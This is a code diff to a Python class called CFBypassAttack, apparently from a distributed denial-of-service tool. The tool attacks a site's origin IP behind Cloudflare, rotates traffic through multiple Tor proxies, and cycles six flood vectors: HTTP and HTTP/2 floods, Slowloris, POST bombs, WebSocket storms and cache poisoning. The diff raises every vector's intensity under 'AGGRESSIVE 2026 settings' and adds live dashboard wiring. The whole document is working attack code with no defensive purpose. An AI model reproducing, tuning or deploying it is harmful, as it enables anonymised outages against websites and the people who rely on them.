@@ -26,6 +26,8 @@ class CFBypassAttack:
         use_https: bool = True,
         tor_instances: int = 10,
         tor_socks_base: int = 9250,
+        stats_queue=None,
+        stop_event=None,
     ):
         self.target_domain = target_domain
         self.origin_ip = origin_ip
@@ -34,21 +36,24 @@ class CFBypassAttack:
         self.tor_proxies = self._build_tor_proxies(tor_instances, tor_socks_base)
         self.tor_instances = tor_instances
         self.engine = None
+        # Live dashboard wiring
+        self.stats_queue = stats_queue
+        self.stop_event = stop_event
     
     @staticmethod
     def _build_tor_proxies(count: int, base_port: int) -> List[str]:
         return [f"socks5://127.0.0.1:{base_port + i*2}" for i in range(count)]
     
     def _build_vector_schedule(self, duration: int) -> List[VectorConfig]:
-        """Build 6-vector rotation for the full duration."""
-        per_vector = max(10, duration // 6)
+        """Build 6-vector rotation for the full duration. AGGRESSIVE 2026 settings."""
+        per_vector = max(20, duration // 6)
         return [
-            VectorConfig(AttackVector.HTTP_FLOOD, per_vector, 100, 30.0, 50*1024, "HTTP flood"),
-            VectorConfig(AttackVector.HTTP2_FLOOD, per_vector, 50, 50.0, 10*1024, "HTTP/2 flood"),
-            VectorConfig(AttackVector.SLOWLORIS, per_vector, 500, 0.067, 1024, "Slowloris hold"),
-            VectorConfig(AttackVector.POST_BOMB, per_vector, 10, 0.5, 1024*1024, "POST bomb"),
-            VectorConfig(AttackVector.WEBSOCKET_STORM, per_vector, 200, 2.0, 1024, "WebSocket storm"),
-            VectorConfig(AttackVector.CACHE_POISON, per_vector, 100, 30.0, 10*1024, "Cache poison"),
+            VectorConfig(AttackVector.HTTP_FLOOD,    per_vector, 400, 50.0, 50*1024,    "HTTP flood"),
+            VectorConfig(AttackVector.HTTP2_FLOOD,   per_vector, 200, 80.0, 10*1024,    "HTTP/2 flood"),
+            VectorConfig(AttackVector.SLOWLORIS,     per_vector, 1500, 0.067, 1024,     "Slowloris hold"),
+            VectorConfig(AttackVector.POST_BOMB,     per_vector, 80,  2.0,   2*1024*1024, "POST bomb"),
+            VectorConfig(AttackVector.WEBSOCKET_STORM, per_vector, 500, 4.0, 1024,      "WebSocket storm"),
+            VectorConfig(AttackVector.CACHE_POISON,  per_vector, 400, 40.0, 10*1024,    "Cache poison"),
         ]
     
     async def start(self, duration: int = 600) -> CFBypassAttackResult:
@@ -64,6 +69,9 @@ class CFBypassAttack:
             vector_schedule=schedule,
             proxies=self.tor_proxies,
             max_duration=duration,
+            stats_queue=self.stats_queue,
+            stop_event=self.stop_event,
+            vector_name_prefix="cf_",
         )
         self.engine = engine
         
